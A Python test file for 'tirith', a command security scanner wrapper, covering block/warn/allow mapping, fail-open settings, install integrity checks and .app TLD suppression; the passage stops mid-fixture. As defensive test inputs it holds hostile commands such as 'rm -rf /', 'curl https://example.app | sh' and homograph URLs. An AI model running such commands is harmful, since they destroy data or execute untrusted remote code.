"""Tests for the tirith security scanning subprocess wrapper."""

import io
import json
import os
import subprocess
import tarfile
import time
from unittest.mock import MagicMock, patch

import pytest

import tools.tirith_security as _tirith_mod
from tools.tirith_security import check_command_security, ensure_installed


@pytest.fixture(autouse=True)
def _reset_resolved_path():
    """Pre-set cached path to skip auto-install in scan tests.
    Tests that specifically test ensure_installed / resolve behavior
    reset this to None themselves.
    """
    _tirith_mod._resolved_path = "tirith"
    _tirith_mod._install_thread = None
    _tirith_mod._install_failure_reason = ""
    _tirith_mod._crash_count = 0
    _tirith_mod._circuit_open = False
    yield
    _tirith_mod._resolved_path = None
    _tirith_mod._install_thread = None
    _tirith_mod._install_failure_reason = ""
    _tirith_mod._crash_count = 0
    _tirith_mod._circuit_open = False


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _mock_run(returncode=0, stdout="", stderr=""):
    """Build a mock subprocess.CompletedProcess."""
    cp = MagicMock(spec=subprocess.CompletedProcess)
    cp.returncode = returncode
    cp.stdout = stdout
    cp.stderr = stderr
    return cp


def _json_stdout(findings=None, summary=""):
    return json.dumps({"findings": findings or [], "summary": summary})


# ---------------------------------------------------------------------------
# Exit code → action mapping
# ---------------------------------------------------------------------------

class TestExitCodeMapping:
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_exit_0_allow(self, mock_cfg, mock_run):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        mock_run.return_value = _mock_run(0, _json_stdout())
        result = check_command_security("echo hello")
        assert result["action"] == "allow"
        assert result["findings"] == []

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_exit_1_block_with_findings(self, mock_cfg, mock_run):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        findings = [{"rule_id": "homograph_url", "severity": "high"}]
        mock_run.return_value = _mock_run(1, _json_stdout(findings, "homograph detected"))
        result = check_command_security("curl http://gооgle.com")
        assert result["action"] == "block"
        assert len(result["findings"]) == 1
        assert result["summary"] == "homograph detected"

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_exit_2_warn_with_findings(self, mock_cfg, mock_run):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        findings = [{"rule_id": "shortened_url", "severity": "medium"}]
        mock_run.return_value = _mock_run(2, _json_stdout(findings, "shortened URL"))
        result = check_command_security("curl https://bit.ly/abc")
        assert result["action"] == "warn"
        assert len(result["findings"]) == 1
        assert result["summary"] == "shortened URL"


# ---------------------------------------------------------------------------
# JSON parse failure (exit code still wins)
# ---------------------------------------------------------------------------

class TestJsonParseFailure:
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_exit_1_invalid_json_still_blocks(self, mock_cfg, mock_run):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        mock_run.return_value = _mock_run(1, "NOT JSON")
        result = check_command_security("bad command")
        assert result["action"] == "block"
        assert "details unavailable" in result["summary"]

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_exit_0_invalid_json_allows(self, mock_cfg, mock_run):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        mock_run.return_value = _mock_run(0, "NOT JSON")
        result = check_command_security("safe command")
        assert result["action"] == "allow"


# ---------------------------------------------------------------------------
# Operational failures + fail_open
# ---------------------------------------------------------------------------

class TestOSErrorFailOpen:
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_file_not_found_fail_open(self, mock_cfg, mock_run):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        mock_run.side_effect = FileNotFoundError("No such file: tirith")
        result = check_command_security("echo hi")
        assert result["action"] == "allow"
        assert "unavailable" in result["summary"]

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_os_error_fail_closed(self, mock_cfg, mock_run):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": False}
        mock_run.side_effect = FileNotFoundError("No such file: tirith")
        result = check_command_security("echo hi")
        assert result["action"] == "block"
        assert "fail-closed" in result["summary"]


class TestTimeoutFailOpen:
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_timeout_fail_closed(self, mock_cfg, mock_run):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": False}
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="tirith", timeout=5)
        result = check_command_security("slow command")
        assert result["action"] == "block"
        assert "fail-closed" in result["summary"]


class TestUnknownExitCode:
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_unknown_exit_code_fail_closed(self, mock_cfg, mock_run):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": False}
        mock_run.return_value = _mock_run(99, "")
        result = check_command_security("cmd")
        assert result["action"] == "block"
        assert "exit code 99" in result["summary"]


# ---------------------------------------------------------------------------
# Disabled
# ---------------------------------------------------------------------------

class TestDisabled:
    @patch("tools.tirith_security._load_security_config")
    def test_disabled_returns_allow(self, mock_cfg):
        mock_cfg.return_value = {"tirith_enabled": False, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        result = check_command_security("rm -rf /")
        assert result["action"] == "allow"


# ---------------------------------------------------------------------------
# Findings cap + summary cap
# ---------------------------------------------------------------------------

class TestCaps:
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_findings_and_summary_capped(self, mock_cfg, mock_run):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        findings = [{"rule_id": f"rule_{i}"} for i in range(100)]
        mock_run.return_value = _mock_run(2, _json_stdout(findings, "x" * 1000))
        result = check_command_security("cmd")
        assert len(result["findings"]) == 50
        assert len(result["summary"]) == 500


# ---------------------------------------------------------------------------
# Programming errors propagate
# ---------------------------------------------------------------------------

class TestProgrammingErrors:
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_attribute_error_propagates(self, mock_cfg, mock_run):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        mock_run.side_effect = AttributeError("unexpected bug")
        with pytest.raises(AttributeError):
            check_command_security("cmd")


# ---------------------------------------------------------------------------
# ensure_installed
# ---------------------------------------------------------------------------

class TestEnsureInstalled:
    @patch("tools.tirith_security._load_security_config")
    def test_disabled_returns_none(self, mock_cfg):
        mock_cfg.return_value = {"tirith_enabled": False, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        _tirith_mod._resolved_path = None
        assert ensure_installed() is None

    @patch("tools.tirith_security.shutil.which", return_value="/usr/local/bin/tirith")
    @patch("tools.tirith_security._load_security_config")
    def test_found_on_path_returns_immediately(self, mock_cfg, mock_which):
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        _tirith_mod._resolved_path = None
        with patch("os.path.isfile", return_value=True), \
             patch("os.access", return_value=True):
            result = ensure_installed()
        assert result == "/usr/local/bin/tirith"
        _tirith_mod._resolved_path = None


# ---------------------------------------------------------------------------
# Unsupported platform (Windows etc.) — silent fast-path everywhere
# ---------------------------------------------------------------------------

class TestUnsupportedPlatform:
    """When _detect_target() returns None (no tirith binary for this OS+arch),
    the entire subsystem must stay silent: no PATH probes, no download thread,
    no disk failure marker, no spawn attempts, no CLI banner. Pattern-matching
    guards still cover the gap; tirith content scanning is just absent."""

    @pytest.mark.parametrize("system, machine, expected", [
        ("Linux", "x86_64", True),
        ("Windows", "AMD64", False),
        ("Linux", "riscv64", False),
    ])
    def test_is_platform_supported(self, system, machine, expected):
        # The patched (system, machine) pairs are table inputs, not a host
        # fake: is_platform_supported() is a pure string mapping that touches
        # no OS facility beneath the check, so there is nothing for a real
        # host to falsify. Two of the rows (Windows/AMD64, Linux/riscv64)
        # could never execute honestly anyway — the second has no CI runner
        # on any lane.
        with patch("tools.tirith_security.platform.system", return_value=system), \
             patch("tools.tirith_security.platform.machine", return_value=machine):
            assert _tirith_mod.is_platform_supported() is expected


    @patch("tools.tirith_security._load_security_config")
    def test_check_command_security_unsupported_allows_silently(self, mock_cfg):
        """Windows: skip the resolver and spawn entirely — return allow with
        an empty summary so callers can't accidentally surface 'tirith
        unavailable' messaging to the user."""
        mock_cfg.return_value = {"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        with patch("tools.tirith_security.is_platform_supported", return_value=False), \
             patch("tools.tirith_security.subprocess.run") as mock_run, \
             patch("tools.tirith_security._resolve_tirith_path") as mock_resolve:
            result = check_command_security("rm -rf /")
            assert result == {"action": "allow", "findings": [], "summary": ""}
            mock_run.assert_not_called()
            mock_resolve.assert_not_called()

    @patch("tools.tirith_security._load_security_config")
    def test_explicit_path_still_honored_on_unsupported_platform(self, mock_cfg):
        """If a user explicitly configured a tirith_path (e.g. they built it
        themselves under WSL), the unsupported-platform short-circuit must
        NOT override that — explicit config wins."""
        mock_cfg.return_value = {"tirith_enabled": True,
                                 "tirith_path": "/opt/custom/tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}
        _tirith_mod._resolved_path = None
        with patch("tools.tirith_security.is_platform_supported", return_value=False), \
             patch("os.path.isfile", return_value=True), \
             patch("os.access", return_value=True):
            result = _tirith_mod._resolve_tirith_path("/opt/custom/tirith")
            assert result == "/opt/custom/tirith"
            assert _tirith_mod._resolved_path == "/opt/custom/tirith"


# ---------------------------------------------------------------------------
# Failed download caches the miss (Finding #1)
# ---------------------------------------------------------------------------

class TestFailedDownloadCaching:
    @patch("tools.tirith_security._mark_install_failed")
    @patch("tools.tirith_security._is_install_failed_on_disk", return_value=False)
    @patch("tools.tirith_security._install_tirith", return_value=(None, "download_failed"))
    @patch("tools.tirith_security.shutil.which", return_value=None)
    def test_failed_install_cached_no_retry(self, mock_which, mock_install,
                                             mock_disk_check, mock_mark):
        """After a failed download, subsequent resolves must not retry."""
        from tools.tirith_security import _resolve_tirith_path, _INSTALL_FAILED
        _tirith_mod._resolved_path = None

        # First call: tries install, fails
        _resolve_tirith_path("tirith")
        assert mock_install.call_count == 1
        assert _tirith_mod._resolved_path is _INSTALL_FAILED
        mock_mark.assert_called_once_with("download_failed")  # reason persisted

        # Second call: hits the cache, does NOT call _install_tirith again
        _resolve_tirith_path("tirith")
        assert mock_install.call_count == 1  # still 1, not 2

        _tirith_mod._resolved_path = None


# ---------------------------------------------------------------------------
# Explicit path must not auto-download (Finding #2)
# ---------------------------------------------------------------------------

class TestExplicitPathNoAutoDownload:
    @patch("tools.tirith_security._install_tirith")
    @patch("tools.tirith_security.shutil.which", return_value=None)
    def test_tilde_explicit_path_missing_no_download(self, mock_which, mock_install):
        """An explicit ~/path that doesn't exist must NOT trigger download."""
        from tools.tirith_security import _resolve_tirith_path, _INSTALL_FAILED
        _tirith_mod._resolved_path = None

        result = _resolve_tirith_path("~/bin/tirith")
        mock_install.assert_not_called()
        assert _tirith_mod._resolved_path is _INSTALL_FAILED
        assert "~" not in result  # tilde still expanded

        _tirith_mod._resolved_path = None

    @patch("tools.tirith_security._mark_install_failed")
    @patch("tools.tirith_security._is_install_failed_on_disk", return_value=False)
    @patch("tools.tirith_security._install_tirith", return_value=("/auto/tirith", ""))
    @patch("tools.tirith_security.shutil.which", return_value=None)
    def test_default_path_does_auto_download(self, mock_which, mock_install,
                                              mock_disk_check, mock_mark):
        """The default bare 'tirith' SHOULD trigger auto-download."""
        from tools.tirith_security import _resolve_tirith_path
        _tirith_mod._resolved_path = None

        result = _resolve_tirith_path("tirith")
        mock_install.assert_called_once()
        assert result == "/auto/tirith"

        _tirith_mod._resolved_path = None


# ---------------------------------------------------------------------------
# Cosign provenance verification (P1)
# ---------------------------------------------------------------------------

class TestCosignVerification:
    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security.shutil.which", return_value="/usr/bin/cosign")
    def test_cosign_identity_pinned_to_release_workflow(self, mock_which, mock_run):
        """Identity regexp must pin to the release workflow, not the whole repo."""
        from tools.tirith_security import _verify_cosign
        mock_run.return_value = _mock_run(0, "Verified OK")
        _verify_cosign("/tmp/checksums.txt", "/tmp/sig", "/tmp/cert")
        args = mock_run.call_args[0][0]
        # Find the value after --certificate-identity-regexp
        idx = args.index("--certificate-identity-regexp")
        identity = args[idx + 1]
        # The identity contains regex-escaped dots
        assert "workflows/release" in identity
        assert "refs/tags/v" in identity


    @patch("tools.tirith_security.tarfile.open")
    @patch("tools.tirith_security._verify_checksum", return_value=True)
    @patch("tools.tirith_security.shutil.which", return_value=None)
    @patch("tools.tirith_security._download_file")
    @patch("tools.tirith_security._detect_target", return_value="aarch64-apple-darwin")
    def test_install_proceeds_without_cosign(self, mock_target, mock_dl,
                                              mock_which, mock_checksum,
                                              mock_tarfile):
        """_install_tirith proceeds with SHA-256 only when cosign is not on PATH."""
        from tools.tirith_security import _install_tirith
        mock_tar = MagicMock()
        mock_tar.__enter__ = MagicMock(return_value=mock_tar)
        mock_tar.__exit__ = MagicMock(return_value=False)
        mock_tar.getmembers.return_value = []
        mock_tarfile.return_value = mock_tar

        path, reason = _install_tirith()
        # Reaches extraction (no binary in mock archive), but got past cosign
        assert path is None
        assert reason == "binary_not_in_archive"
        assert mock_checksum.called  # SHA-256 verification ran


class TestInstallArchiveMemberValidation:
    def _write_archive(self, tmp_path, member: tarfile.TarInfo, data: bytes | None = None):
        archive = tmp_path / "tirith-aarch64-apple-darwin.tar.gz"
        checksums = tmp_path / "checksums.txt"
        with tarfile.open(archive, "w:gz") as tar:
            if data is None:
                tar.addfile(member)
            else:
                tar.addfile(member, io.BytesIO(data))
        checksums.write_text(
            "ignored  tirith-aarch64-apple-darwin.tar.gz\n",
            encoding="utf-8",
        )
        return archive, checksums

    def _download_side_effect(self, archive, checksums):
        def _download(url, dest, timeout=10):
            del timeout
            if url.endswith(".tar.gz"):
                with open(archive, "rb") as src, open(dest, "wb") as dst:
                    dst.write(src.read())
                return
            if url.endswith("checksums.txt"):
                with open(checksums, "rb") as src, open(dest, "wb") as dst:
                    dst.write(src.read())
                return
            raise AssertionError(f"unexpected download URL: {url}")

        return _download

    @patch("tools.tirith_security._verify_checksum", return_value=True)
    @patch("tools.tirith_security.shutil.which", return_value=None)
    @patch("tools.tirith_security._detect_target", return_value="aarch64-apple-darwin")
    def test_install_extracts_regular_tirith_member(self, mock_target, mock_which,
                                                    mock_checksum, tmp_path, monkeypatch):
        """A valid regular-file tirith member is installed as a plain file."""
        del mock_target, mock_which, mock_checksum
        from tools.tirith_security import _install_tirith

        payload = b"#!/bin/sh\nexit 0\n"
        member = tarfile.TarInfo("bin/tirith")
        member.mode = 0o755
        member.size = len(payload)
        archive, checksums = self._write_archive(tmp_path, member, payload)

        hermes_home = tmp_path / "hermes-home"
        monkeypatch.setenv("HERMES_HOME", str(hermes_home))
        with patch("tools.tirith_security._download_file",
                   side_effect=self._download_side_effect(archive, checksums)):
            path, reason = _install_tirith(log_failures=False)

        assert reason == ""
        assert path == str(hermes_home / "bin" / "tirith")
        assert os.path.isfile(path)
        assert not os.path.islink(path)
        with open(path, "rb") as f:
            assert f.read() == payload

    @patch("tools.tirith_security._verify_checksum", return_value=True)
    @patch("tools.tirith_security.shutil.which", return_value=None)
    @patch("tools.tirith_security._detect_target", return_value="aarch64-apple-darwin")
    def test_install_rejects_non_regular_tirith_member(self, mock_target, mock_which,
                                                       mock_checksum, tmp_path, monkeypatch):
        """Symlink or hardlink tar members must not be installed as tirith."""
        del mock_target, mock_which, mock_checksum
        from tools.tirith_security import _install_tirith

        member = tarfile.TarInfo("bin/tirith")
        member.type = tarfile.SYMTYPE
        member.linkname = "/bin/sh"
        archive, checksums = self._write_archive(tmp_path, member)

        hermes_home = tmp_path / "hermes-home"
        monkeypatch.setenv("HERMES_HOME", str(hermes_home))
        with patch("tools.tirith_security._download_file",
                   side_effect=self._download_side_effect(archive, checksums)):
            path, reason = _install_tirith(log_failures=False)

        assert path is None
        assert reason == "binary_not_regular_file"
        assert not os.path.lexists(hermes_home / "bin" / "tirith")


# ---------------------------------------------------------------------------
# Background install / non-blocking startup (P2)
# ---------------------------------------------------------------------------

class TestBackgroundInstall:
    def test_ensure_installed_non_blocking(self):
        """ensure_installed must return immediately when download needed."""
        _tirith_mod._resolved_path = None

        with patch("tools.tirith_security._load_security_config",
                   return_value={"tirith_enabled": True, "tirith_path": "tirith",
                                 "tirith_timeout": 5, "tirith_fail_open": True}), \
             patch("tools.tirith_security.shutil.which", return_value=None), \
             patch("tools.tirith_security._hermes_bin_dir", return_value="/nonexistent"), \
             patch("tools.tirith_security._is_install_failed_on_disk", return_value=False), \
             patch("tools.tirith_security.threading.Thread") as MockThread:
            mock_thread = MagicMock()
            mock_thread.is_alive.return_value = False
            MockThread.return_value = mock_thread

            result = ensure_installed()
            assert result is None  # not available yet
            MockThread.assert_called_once()
            mock_thread.start.assert_called_once()

        _tirith_mod._resolved_path = None

    def test_resolve_returns_default_when_thread_alive(self):
        """_resolve_tirith_path returns default while background thread runs."""
        from tools.tirith_security import _resolve_tirith_path
        _tirith_mod._resolved_path = None
        mock_thread = MagicMock()
        mock_thread.is_alive.return_value = True
        _tirith_mod._install_thread = mock_thread

        with patch("tools.tirith_security.shutil.which", return_value=None), \
             patch("tools.tirith_security._hermes_bin_dir", return_value="/nonexistent"):
            result = _resolve_tirith_path("tirith")
            assert result == "tirith"  # returns configured default, doesn't block

        _tirith_mod._install_thread = None
        _tirith_mod._resolved_path = None


# ---------------------------------------------------------------------------
# Disk failure marker persistence (P2)
# ---------------------------------------------------------------------------

class TestDiskFailureMarker:
    def test_expired_marker_ignored(self):
        """Marker older than TTL should be ignored."""
        import tempfile
        tmpdir = tempfile.mkdtemp()
        marker = os.path.join(tmpdir, ".tirith-install-failed")
        with patch("tools.tirith_security._failure_marker_path", return_value=marker):
            from tools.tirith_security import _mark_install_failed, _is_install_failed_on_disk
            assert not _is_install_failed_on_disk()
            _mark_install_failed("download_failed")
            assert _is_install_failed_on_disk()
            # Backdate the file past 24h TTL
            old_time = time.time() - 90000  # 25 hours ago
            os.utime(marker, (old_time, old_time))
            assert not _is_install_failed_on_disk()


    def test_in_memory_cosign_exec_failed_not_retried(self):
        """In-memory _INSTALL_FAILED with cosign_exec_failed is NOT retried."""
        from tools.tirith_security import _resolve_tirith_path, _INSTALL_FAILED
        _tirith_mod._resolved_path = _INSTALL_FAILED
        _tirith_mod._install_failure_reason = "cosign_exec_failed"

        with patch("tools.tirith_security.shutil.which", return_value=None), \
             patch("tools.tirith_security._hermes_bin_dir", return_value="/nonexistent"), \
             patch("tools.tirith_security._install_tirith") as mock_install:
            result = _resolve_tirith_path("tirith")
            assert result == "tirith"  # fallback
            mock_install.assert_not_called()

        _tirith_mod._resolved_path = None


# ---------------------------------------------------------------------------
# HERMES_HOME isolation
# ---------------------------------------------------------------------------

class TestHermesHomeIsolation:
    def test_hermes_bin_dir_respects_hermes_home(self):
        """_hermes_bin_dir must use HERMES_HOME, not hardcoded ~/.hermes."""
        from tools.tirith_security import _hermes_bin_dir
        import tempfile
        tmpdir = tempfile.mkdtemp()
        with patch.dict(os.environ, {"HERMES_HOME": tmpdir}):
            result = _hermes_bin_dir()
        assert result == os.path.join(tmpdir, "bin")
        assert os.path.isdir(result)


# ---------------------------------------------------------------------------
# Warn-once dedupe (issue: tirith spawn failed spamming on Windows)
# ---------------------------------------------------------------------------

class TestSpawnWarningDedup:
    """When tirith isn't installed yet (background install in flight, or
    install marked failed), every terminal command spammed an identical
    ``tirith spawn failed: [WinError 2]`` warning to ``errors.log``. The
    dedupe set in ``_warn_once`` collapses repeats by ``(exc class, errno)``
    while still surfacing the first occurrence so users see the failure.
    """

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_repeated_spawn_failure_logs_once(self, mock_cfg, mock_run, caplog):
        mock_cfg.return_value = {
            "tirith_enabled": True, "tirith_path": "tirith",
            "tirith_timeout": 5, "tirith_fail_open": True,
        }
        mock_run.side_effect = FileNotFoundError("[WinError 2]")
        # Fresh dedupe state — clear any keys left by other tests.
        _tirith_mod._reset_spawn_warning_state()

        with caplog.at_level("WARNING", logger="tools.tirith_security"):
            for i in range(15):
                result = check_command_security("echo hi")
                # Behavior must remain the same on every call —
                # fail-open allow, with the exception captured in summary.
                assert result["action"] == "allow"
                if i < _tirith_mod._CRASH_LIMIT:
                    # Before circuit breaker opens, summary has the exception
                    assert "unavailable" in result["summary"]
                else:
                    # After circuit breaker opens, summary is generic
                    assert "circuit breaker" in result["summary"]

        spawn_warnings = [
            rec for rec in caplog.records
            if "tirith spawn failed" in rec.message
        ]
        assert len(spawn_warnings) == 1, (
            f"expected exactly 1 spawn-failed warning across 15 commands, "
            f"got {len(spawn_warnings)}: {[r.message for r in spawn_warnings]}"
        )


# ---------------------------------------------------------------------------
# .app TLD suppression (issue #24461)
# ---------------------------------------------------------------------------

_CFG = {"tirith_enabled": True, "tirith_path": "tirith",
        "tirith_timeout": 5, "tirith_fail_open": True}


class TestAppTldSuppression:
    """warn verdicts whose only finding is lookalike_tld/.app are downgraded to allow."""

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_app_only_warn_downgraded_to_allow(self, mock_cfg, mock_run):
        mock_cfg.return_value = _CFG
        findings = [{"rule_id": "lookalike_tld", "value": ".app",
                     "message": "Domain uses '.app' TLD which can be confused with file extensions"}]
        mock_run.return_value = _mock_run(2, _json_stdout(findings, ".app TLD warning"))
        result = check_command_security("curl https://example.app")
        assert result["action"] == "allow"
        assert result["findings"] == []
        assert result["summary"] == ""

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_mixed_findings_preserve_warn(self, mock_cfg, mock_run):
        """If .app finding is accompanied by another finding, warn is preserved."""
        mock_cfg.return_value = _CFG
        findings = [
            {"rule_id": "lookalike_tld", "value": ".app"},
            {"rule_id": "shortened_url", "severity": "medium"},
        ]
        mock_run.return_value = _mock_run(2, _json_stdout(findings, "mixed"))
        result = check_command_security("curl https://bit.ly/test.app")
        assert result["action"] == "warn"
        assert len(result["findings"]) == 2

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_app_only_block_downgraded_to_allow(self, mock_cfg, mock_run):
        """block verdicts whose only finding is a LOW/MEDIUM lookalike_tld/.app are downgraded."""
        mock_cfg.return_value = _CFG
        findings = [{"rule_id": "lookalike_tld", "severity": "MEDIUM", "value": ".app"}]
        mock_run.return_value = _mock_run(1, _json_stdout(findings, "block"))
        result = check_command_security("curl https://api.bsky.app/xrpc/app.bsky.feed.searchPosts")
        assert result["action"] == "allow"
        assert result["findings"] == []
        assert result["summary"] == ""

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_high_severity_app_block_not_downgraded(self, mock_cfg, mock_run):
        """A HIGH-severity (or severity-less) .app block is never downgraded —
        tirith may have escalated it via policy override or correlation."""
        mock_cfg.return_value = _CFG
        for sev_fields in ({"severity": "HIGH"}, {}):
            findings = [{"rule_id": "lookalike_tld", "value": ".app", **sev_fields}]
            mock_run.return_value = _mock_run(1, _json_stdout(findings, "block"))
            result = check_command_security("curl https://example.app")
            assert result["action"] == "block", f"fields={sev_fields}"

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_zip_only_block_not_suppressed(self, mock_cfg, mock_run):
        """A lookalike_tld block for a non-.app TLD is preserved end to end."""
        mock_cfg.return_value = _CFG
        findings = [{"rule_id": "lookalike_tld", "severity": "MEDIUM", "value": ".zip",
                     "description": "Domain uses '.zip' TLD which can be confused with file extensions"}]
        mock_run.return_value = _mock_run(1, _json_stdout(findings, "block"))
        result = check_command_security("curl https://evil.zip")
        assert result["action"] == "block"

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_real_schema_v3_app_warn_suppressed(self, mock_cfg, mock_run):
        """The finding shape tirith 0.3.x actually emits (description/evidence,
        no value/tld fields) is recognized and suppressed."""
        mock_cfg.return_value = _CFG
        findings = [{
            "rule_id": "lookalike_tld",
            "severity": "MEDIUM",
            "title": "Lookalike TLD detected",
            "description": "Domain uses '.app' TLD which can be confused with file extensions",
            "evidence": [{"type": "url", "raw": "api.bsky.app"}],
            "remediation": "Verify the domain is legitimate and not impersonating a file download.",
        }]
        mock_run.return_value = _mock_run(2, _json_stdout(findings, ".app TLD warning"))
        result = check_command_security("curl https://api.bsky.app/xrpc/app.bsky.feed.searchPosts")
        assert result["action"] == "allow"

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_mixed_findings_preserve_block(self, mock_cfg, mock_run):
        """A block accompanied by any non-.app finding stays blocked."""
        mock_cfg.return_value = _CFG
        findings = [
            {"rule_id": "lookalike_tld", "value": ".app"},
            {"rule_id": "pipe_to_interpreter", "severity": "high"},
        ]
        mock_run.return_value = _mock_run(1, _json_stdout(findings, "mixed block"))
        result = check_command_security("curl https://example.app | sh")
        assert result["action"] == "block"

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_block_without_findings_not_downgraded(self, mock_cfg, mock_run):
        """JSON parse failure (no findings) never downgrades a block verdict."""
        mock_cfg.return_value = _CFG
        mock_run.return_value = _mock_run(1, "not json")
        result = check_command_security("curl https://example.app")
        assert result["action"] == "block"

    @patch("tools.tirith_security.subprocess.run")
    @patch("tools.tirith_security._load_security_config")
    def test_truncated_non_app_finding_preserves_block(self, mock_cfg, mock_run):
        """A non-.app finding beyond the _MAX_FINDINGS cap still preserves the verdict."""
        mock_cfg.return_value = _CFG
        findings = [{"rule_id": "lookalike_tld", "value": ".app"}] * _tirith_mod._MAX_FINDINGS
        findings.append({"rule_id": "pipe_to_interpreter", "severity": "high"})
        mock_run.return_value = _mock_run(1, _json_stdout(findings, "truncated"))
        result = check_command_security("curl https://example.app | sh")
        assert result["action"] == "block"


class TestIsAppTldFinding:
    """Unit tests for the _is_app_tld_finding helper."""

    @pytest.mark.parametrize("finding, expected", [
        ({"rule_id": "lookalike_tld", "value": ".APP"}, True),   # case-insensitive
        ({"rule_id": "lookalike_tld", "message": "Domain uses '.app' TLD"}, True),
        ({"rule_id": "shortened_url", "value": ".app"}, False),  # wrong rule_id
        ({"rule_id": "lookalike_tld", "value": ".zip"}, False),  # other TLD
        # substring matches must NOT count: only exact ".app" or quoted '.app'
        ({"rule_id": "lookalike_tld", "value": ".application"}, False),
        ({"rule_id": "lookalike_tld", "message": "TLDs such as .zip, .app, .mov"}, False),
        ({"rule_id": "lookalike_tld", "description": "Domain uses '.APP' TLD"}, True),
    ])
    def test_app_tld_detection(self, finding, expected):
        from tools.tirith_security import _is_app_tld_finding
        assert _is_app_tld_finding(finding) is expected


# ---------------------------------------------------------------------------
# mkdtemp OSError → no_space (disk-full leak prevention)
# ---------------------------------------------------------------------------

class TestMkdtempOSErrorNoSpace:
    """When tempfile.mkdtemp raises OSError (e.g. disk full), _install_tirith
    must return (None, "no_space") instead of propagating the exception.
    This prevents the unbounded retry + temp-dir leak described in #51826.
    """

    def test_mkdtemp_oserror_returns_no_space(self):
        from tools.tirith_security import _install_tirith

        with patch("tools.tirith_security.tempfile.mkdtemp",
                   side_effect=OSError(28, "No space left on device")):
            result, reason = _install_tirith(log_failures=False)
            assert result is None
            assert reason == "no_space"

    def test_mkdtemp_oserror_does_not_leak_tempdir(self):
        """No temp directory should remain after a mkdtemp failure."""
        import glob
        from tools.tirith_security import _install_tirith

        before = set(glob.glob("/tmp/tirith-install-*"))
        with patch("tools.tirith_security.tempfile.mkdtemp",
                   side_effect=OSError(28, "No space left on device")):
            _install_tirith(log_failures=False)
        after = set(glob.glob("/tmp/tirith-install-*"))
        assert after - before == set()


# ---------------------------------------------------------------------------
# Per-surface fail-closed (H-021 / plan 0-5)
# ---------------------------------------------------------------------------

def _cfg(*, fail_open=True, fail_open_gateway=False, path="tirith"):
    return {
        "tirith_enabled": True,
        "tirith_path": path,
        "tirith_timeout": 5,
        "tirith_fail_open": fail_open,
        "tirith_fail_open_gateway": fail_open_gateway,
    }


@pytest.fixture
def local_surface(monkeypatch):
    monkeypatch.delenv("HERMES_GATEWAY_SESSION", raising=False)
    monkeypatch.delenv("HERMES_CRON_SESSION", raising=False)
    monkeypatch.delenv("HERMES_SESSION_PLATFORM", raising=False)


@pytest.fixture(params=["gateway", "cron"])
def remote_surface(request, monkeypatch):
    """Bind one of the surfaces where nobody is watching the terminal."""
    monkeypatch.delenv("HERMES_GATEWAY_SESSION", raising=False)
    monkeypatch.delenv("HERMES_CRON_SESSION", raising=False)
    monkeypatch.delenv("HERMES_SESSION_PLATFORM", raising=False)
    if request.param == "gateway":
